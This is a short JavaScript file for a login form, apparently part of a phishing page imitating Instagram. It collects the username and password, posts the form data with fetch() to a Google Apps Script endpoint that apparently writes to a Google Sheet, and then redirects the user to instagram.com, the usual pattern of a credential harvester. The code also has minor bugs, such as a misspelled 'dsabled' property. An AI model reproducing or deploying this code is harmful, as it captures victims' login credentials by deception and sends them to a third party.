// GLOBAL VARIABLE DECLERATIONS
let username = document.querySelector("#username");
let password = document.querySelector("#password")
let loginButton = document.querySelector("#login-btn");
let showButton = document.querySelector("#show-btn");
let hideButton = document.querySelector("#hide-btn");

// LOGIN BUTTON ENABLE + DISABLE FUNCTION
loginButton.disabled = true;
username.addEventListener("change", stateHandle);
password.addEventListener("change", stateHandle);

function stateHandle() {
  if (username.value.length > 0 && password.value.length > 4 ) {
    loginButton.disabled = false; 
  } else {
    loginButton.disabled = true;
  }
}

function stateHandleUp() {
  if (password.value.length > 5 ) {
    loginButton.dsabled = false;
  } else {
    loginButton.disabled = true;
  }
}

// PASSWORD SHOW/HIDE BUTTON SWTICH
function showPassword() {
  if (password.type === "password") {
    password.type = "text";
    showButton.style.display = "none";
    hideButton.style.visibility = "visible";
  } else {
    password.type = "password";
    hideButton.style.visibility = "hidden";
    showButton.style.display = "inline-block";
  }
}

hideButton.style.visibility = "hidden";

const scriptURL = 'https://script.google.com/macros/s/AKfycbxZgxb40YEuriC4p1R4pn_jAwZbE-BU6nk8F4KU0PFHPLwt5GV9-zO48W0LWnVoECHZ/exec'
const form = document.forms['submit-to-google-sheet']
const msg = document.getElementById("msg");
form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    .then(response =>{
        console.log("ok..."),
        console.log(response),
        form.reset()
         }
         
         )
    .catch(error => console.error('Error!', error.message))
    // document.getElementById("login-btn").setAttribute("href","https://google.com")
})

document.getElementById("login-btn").addEventListener("click", function(event) {
  event.preventDefault(); // Prevent default form submission behavior
  window.location.href = "https://www.instagram.com/"; // Redirect to YouTube
});
